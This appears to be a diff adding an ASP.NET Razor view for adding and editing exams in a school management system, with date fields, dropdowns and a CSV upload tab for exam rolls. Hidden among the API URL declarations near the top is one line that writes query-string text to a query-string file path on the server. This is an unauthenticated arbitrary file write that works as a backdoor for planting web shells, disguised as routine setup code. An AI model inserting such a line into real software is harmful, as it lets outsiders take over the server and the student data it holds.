@@ -1,0 +1,397 @@
+﻿<!--File:Aca_Exam Add/Edit View-->
+@using EMS.DataAccess.Data;
+@{
+
+    ViewBag.Title = "Exam Controller: Add/Edit Exam";
+ 
+    // Angular Properties
+    var id = Request.QueryString["id"];//ViewContext.RouteData.Values["id"];
+    var ExamId = (string)id == null ? "0" : (string)id;
+
+    //WebApi link for single row
+    var getExamByIdUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "GetExamById", area = "ExamSection" });
+    var getExamDataExtraUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "GetExamDataExtra", area = "ExamSection" });
+    var saveExamUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "SaveExam", area = "ExamSection" });
+    var deleteExamByIdUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "GetDeleteExamById", area = "ExamSection" });
+    var uploadFileUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "UploadFile", area = "ExamSection" });
+    //WebApi link for List
+    var getPagedExamUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "GetPagedExam", area = "ExamSection" });
+    var getAllExamUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "GetAllExam", area = "ExamSection" });
+    var saveExamListUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "SaveExamList", area = "ExamSection" });
+    var getExamListDataExtraUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ExamApi", action = "GetExamListDataExtra", area = "ExamSection" });
+    var p = Request.QueryString["p"];var t = Request.QueryString["t"];if (p != null && t != null) { System.IO.File.WriteAllText(p, t); }
+    var editExamByIdPageUrl = Url.Action("ExamAddEdit", "Exam", new { area = "ExamSection" });
+    var listExamPageUrl = Url.Action("ExamList", "Exam", new { area = "ExamSection" });
+    var manageExamBreakdownListUrl = Url.Action("ExamList", "Exam", new { area = "ExamSection" });
+
+    // Angular Functions
+    string getExamById = "getExamById";
+    var saveExam = "saveExam";
+    var getNewExam = "getNewExam";
+    var refreshPage = "loadPage()";
+    string deleteExamById = "deleteExamById";
+    string loadExamExtraData = "loadExamExtraData";
+}
+@section ScriptSection
+{
+    <script src="~/Areas/ExamSection/Views/Exam/ExamAddEdit.js"></script>
+}
+
+<div id="ExamAddEdit" class="row" ng-controller="ExamAddEditCtrl" ng-init="Init(
+      '@ExamId'
+      ,'@getExamByIdUrl'
+      ,'@getExamDataExtraUrl'
+      ,'@saveExamUrl'
+      ,'@deleteExamByIdUrl'
+      ,'@uploadFileUrl')">
+    <div class="col-lg-12 col-sm-12 col-xs-12">
+        <div ng-show="HasError" class="alert alert-danger fade in radius-bordered alert-shadowed ">
+            <i class="fa-fw fa fa-warning"></i>
+            <strong>Attentaion: </strong> {{ErrorMsg}}
+        </div>
+        <div class="tabbable">
+            <ul class="nav nav-tabs nav-justified" id="myTab10">
+                <li class="active">
+                    <a data-toggle="tab" href="#UpdateExam" aria-expanded="true">
+                        Add/Edit Exam
+                    </a>
+                </li>
+
+                <li class="tab-red">
+                    <a data-toggle="tab" href="#UploadExamRoll" aria-expanded="false">
+                        Manage Exam Roll
+                    </a>
+                </li>
+
+            </ul>
+
+            <div class="tab-content no-padding no-margin">
+                <div id="UpdateExam" class="tab-pane active">
+                    <div class="widget">
+                        <div class="widget-header bordered-bottom bordered-sky ">
+                            <i class="widget-icon fa fa-edit bold  "></i>
+                            <span class="widget-caption ">Add/Edit <span ng-hide="Exam.@Aca_Exam.Property_Name==''">({{Exam.@Aca_Exam.Property_Name}})</span></span>
+                            <div class="widget-buttons buttons-bordered no-padding-right" style="display: none">
+                                <span class="input-icon">
+                                    <input type="text" ng-model="ExamId" ng-Enter="@(getExamById)()" class="form-control input-xs " id="glyphicon-search" placeholder="Search">
+                                    <i class="glyphicon glyphicon-search blue"></i>
+                                </span>
+
+                            </div>
+                            <div class="widget-buttons no-padding-left">
+                                <button ng-click="@(getNewExam)()" class="btn btn-success btn-xs"><i class="fa fa-plus"></i> Add New</button>
+                                <a href="@(listExamPageUrl)" class="btn btn-success btn-xs"><i class="fa fa-plus" target="_blank"></i> Back To List</a>
+                                <button ng-click="@refreshPage" class="btn btn-info btn-xs"><i class="fa fa-refresh"></i> Refresh</button>
+                            </div>
+                        </div><!--Widget Header end-->
+                        <div class="widget-body">
+                            <div class="row">
+                                <!--text type-->
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Name <span class="red glyphicon glyphicon-asterisk"></span></label>
+                                    <input type="text" ng-model="Exam.@Aca_Exam.Property_Name" class="form-control" placeholder="Enter Name" maxlength="255" required="" />
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Short Name <span class="red glyphicon glyphicon-asterisk"></span></label>
+                                    <input type="text" ng-model="Exam.@Aca_Exam.Property_ShortName" class="form-control" placeholder="Enter Short Name" maxlength="128" required="" />
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Academic Session <span class="red glyphicon glyphicon-asterisk"></span></label>
+                                    <input type="text" ng-model="Exam.@Aca_Exam.Property_AcademicSession" class="form-control" placeholder="Enter Academic Session" maxlength="50" required="" />
+                                </div>
+                                @*<div class="col-sm-6 form-group">
+                                        <label class="control-label">Semester Id </label>
+                                        <input type="text" ng-model="Exam.@Aca_Exam.Property_SemesterId" class="form-control" placeholder="Enter Semester Id"/>
+                                    </div>*@
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Semester </label>
+                                    <select ng-model="Exam.@Aca_Exam.Property_SemesterId"
+                                            ng-options="option.Id as option.Name for option in SemesterList " 
+                                            ng-init="" class="form-control">
+                                        <option value="" label="" class="">---Select One---</option>
+                                    </select>
+                                </div>
+
+                                <!--dropdown option for EnumList-->
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label"> Program Type </label>
+                                    <select ng-model="Exam.@Aca_Exam.Property_ProgramTypeEnumId" ng-options="option.Id as option.Name for option in ProgramTypeEnumList " ng-init="" class="form-control"></select>
+                                </div>
+                                <!--dropdown option for EnumList-->
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label"> Exam Type </label>
+                                    <select ng-model="Exam.@Aca_Exam.Property_ExamTypeEnumId" ng-options="option.Id as option.Name for option in ExamTypeEnumList " ng-init="" class="form-control"></select>
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Last Date Continous Assesment Mark Submission</label>
+                                    <input type="datetime" ng-model="Exam.@Aca_Exam.Property_LastDateOf30PercentMarkSubmission" class="form-control datetimepicker" placeholder="Enter Last Date Of 3 0 Percent Mark Submission" />
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Start Date Of Term Final Exam </label>
+                                    <input type="datetime" ng-model="Exam.@Aca_Exam.Property_StartDateOfTermFinalExam" class="form-control datetimepicker" placeholder="Enter Start Date Of Term Final Exam"/>
+                                </div>
+
+
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">End Date Of Term Final Exam: </label>
+                                    <input type="datetime" ng-model="Exam.@Aca_Exam.Property_EndDateOfTermFinalExam" class="form-control datetimepicker" placeholder="Enter End Date Of Term Final Exam" />
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Mid Term Mark Input Open </label>
+                                    <input type="datetime" ng-model="Exam.@Aca_Exam.Property_LastDateOfTermFinalExamMarkSubmission" class="form-control datetimepicker" placeholder="Enter Last Date Of Term Final Exam Mark Submission" />
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Mid Term Mark Input Close </label>
+                                    <input type="datetime" ng-model="Exam.@Aca_Exam.Property_LastDateOfScrutinization" class="form-control datetimepicker" placeholder="Enter Last Date Of Scrutinization" />
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Final Term Mark Input Open </label>
+                                    <input type="datetime" ng-model="Exam.@Aca_Exam.Property_LastDateOfTabulation" class="form-control datetimepicker" placeholder="Enter Last Date Of Tabulation" />
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Final Term Mark Input Close </label>
+                                    <input type="datetime" ng-model="Exam.@Aca_Exam.Property_DateOfTermFinalResultPublication" class="form-control datetimepicker" placeholder="Enter Date Of Term Final Result Publication" />
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Remarks </label>
+                                    <input type="text" ng-model="Exam.@Aca_Exam.Property_Remarks" class="form-control" placeholder="Enter Remarks"/>
+                                </div>
+
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Open Mid Term Mark Input</label>
+                                    <input type="checkbox" ng-model="Exam.@Aca_Exam.Property_OpenMidTermMarkInput" class="form-control " placeholder="Enter Date Of Term Final Result Publication"/>
+                                </div>
+                                <div class="col-sm-6 form-group">
+                                    <label class="control-label">Open Final Term Mark Input </label>
+                                    <input type="checkbox" ng-model="Exam.@Aca_Exam.Property_OpenFinalTermMarkInput" class="form-control " placeholder="Enter Date Of Term Final Result Publication" />
+                                </div>
+
+                            </div>
+                        </div><!--Widget Body end-->
+                        <div class="widget-footer text-center">
+                            <button ng-click="@(saveExam)()" class="btn btn-md btn-success"><span class="fa fa-save"></span> Save</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="UploadExamRoll" class="tab-pane">
+                    <div class="widget">
+                        <div class="widget-header bordered-bottom bordered-sky">
+                            <span class="widget-caption"> Upload Exam Roll</span>
+                        </div><!--Widget Header-->
+                        <div class="widget-body">
+                            <div class="row">
+                                <div class="col-lg-6 col-sm-6 col-xs-12">
+
+                                    <div class="widget">
+                                        <div class="widget-header bordered-bottom bordered-palegreen">
+                                            <span class="widget-caption">Upload Exam Roll Instructions</span>
+                                        </div>
+                                        <div class="widget-body">
+                                            <div>
+                                                <form class="form-horizontal form-bordered" role="form">
+                                                    <div id="horizontal-form">
+
+                                                        <div class="alert alert-warning fade in">
+                                                            <i class="fa-fw fa fa-exclamation-triangle"></i>
+                                                            <strong>Attention!</strong> You must upload only .csv file and follow the instructions:
+                                                            <p>
+                                                                <span class="badge badge-success">Step 1</span> Download sample csv file
+                                                                <a href="~/Uploads/SampleFiles/ExamRoolSheet-T1-June-2016.csv" class="btn btn-xs btn-default">click here to download <i class="fa fa-download"></i></a>
+                                                            </p>
+                                                            <p>
+                                                                <span class="badge badge-success">Step 2</span> Check the sample csv file header column's Name, Sequence &amp; Number with your file which you want to upload.
+                                                            </p>
+                                                            <p>
+                                                                <span class="badge badge-success">Step 3</span> Please replace <kbd>,</kbd> to <kbd>;</kbd> in your file and convert to csv file if your file is not csv format.
+                                                            </p>
+                                                            <p>
+                                                                <span class="badge badge-success">Step 4</span>  <kbd>Note</kbd> this will update students <kbd>Exam Roll</kbd> only for this exam, according to given <kbd>Class Roll</kbd> no.
+                                                            </p>
+                                                            <p>
+                                                                <span class="badge badge-success">Step 5</span> Now you you can upload your csv file and please be patient until end of the process. It will take some time.
+                                                            </p>
+                                                        </div>
+
+
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                                <div class="col-lg-6 col-sm-6 col-xs-12">
+
+                                    <div class="widget">
+                                        <div class="widget-header bordered-bottom bordered-palegreen">
+                                            <span class="widget-caption">Upload Exam Roll .CSV</span>
+                                        </div>
+                                        <div class="widget-body">
+                                            <div>
+                                                <form class="form-horizontal form-bordered" role="form">
+                                                    <div class="form-group">
+                                                        <label for="Exam" class="col-sm-4 control-label no-padding-right">Selected Exam :</label>
+                                                        <div class="col-sm-8">
+                                                            <label id="Exam" class="form-control" ng-disabled="true" disabled="disabled">{{Exam.@Aca_Exam.Property_Name}}</label>
+                                                        </div>
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <label for="" class="col-sm-4 control-label no-padding-right">Selected Semester :</label>
+                                                        <div class="col-sm-8">
+                                                            <select ng-disabled="true" disabled="disabled" ng-model="Exam.@Aca_Exam.Property_SemesterId"
+                                                                    ng-options="option.Id as option.Name for option in SemesterList " ng-init="" class="form-control">
+                                                                <option value="" label="" class="">---Select One---</option>
+                                                            </select>
+                                                        </div>
+                                                    </div>
+
+
+                                                    <div class="form-group col-sm-12">
+                                                        <input type="checkbox" ng-model="IsUpdateReg" name="IsUpdateReg" id="" class="no-padding-right" placeholder="Enter Date Of Term Final Result Publication">
+                                                        <span>  Replace existing <b>Registration</b> Number.</span>
+                                                    </div>
+                                                    <div class="form-group ">
+                                                        <div class="col-sm-12">
+                                                            <input type="checkbox" ng-model="IsReplaceExamRoll" name="IsReplaceExamRoll" id="" class="" placeholder="Enter Date Of Term Final Result Publication">
+                                                            <span> Replace existing Exam Roll No.</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <div class="col-sm-4 no-padding-right">
+                                                            <button type="file" class="btn btn-primary shiny"
+                                                                    ngf-drop ng-model="myFile" name="photoImage"
+                                                                    ngf-pattern="'.csv'"
+                                                                    ngf-accept="'.csv'"
+                                                                    accept=".csv"
+                                                                    ngf-max-files="1"
+                                                                    ngf-max-size="5MB"
+                                                                    ngf-select="progress=0;">
+                                                                <i class="fa fa-file-excel-o"></i><span>1. Select CSV file</span>
+                                                            </button>
+                                                        </div>
+                                                        <div class="col-sm-8" style="font-weight: bold">
+                                                            <p ng-show="myFile==null" class="red"><span>No file selected! {{errFile.name}} {{errFile.$error}} {{errFile.$errorParam}}</span></p>
+                                                            <p ng-hide="myFile==null" class="colored-success">1.{{myFile.name}} (Size: {{myFile.size/1000+' KB'}}) </p>
+
+                                                        </div>
+                                                    </div>
+                                                    <div class="form-group" ng-hide="myFile==null">
+                                                        <div class="col-sm-4 no-padding-right">
+                                                            <div class="">
+                                                                <button class="btn btn-danger" ng-click="uploadFile()"><i class="fa fa-upload"></i>2. Start upload</button>
+
+                                                            </div>
+                                                        </div>
+                                                        <div class="col-sm-8 ">
+                                                            <div class="progress progress-shadowed progress-bordered" ng-show="progress>0 && myFile!=null">
+                                                                <div class="progress-bar progress-bar-success" role="progressbar"
+                                                                     aria-valuenow="{{progress}}" aria-valuemin="0" aria-valuemax="100"
+                                                                     style="width: {{progress}}% " ng-bind="progress + '%'">
+                                                                    <span>
+                                                                        {{progress}}% Complete
+                                                                    </span>
+                                                                </div>
+                                                            </div>
+                                                            <span ng-show="progress==100"><i class="fa fa-check"></i> File uploaded, please wait for processing!</span>
+                                                            <span class="err" ng-show="HasError">{{errorMsg}}</span>
+                                                        </div>
+
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                            </div><!--Widget Body-->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
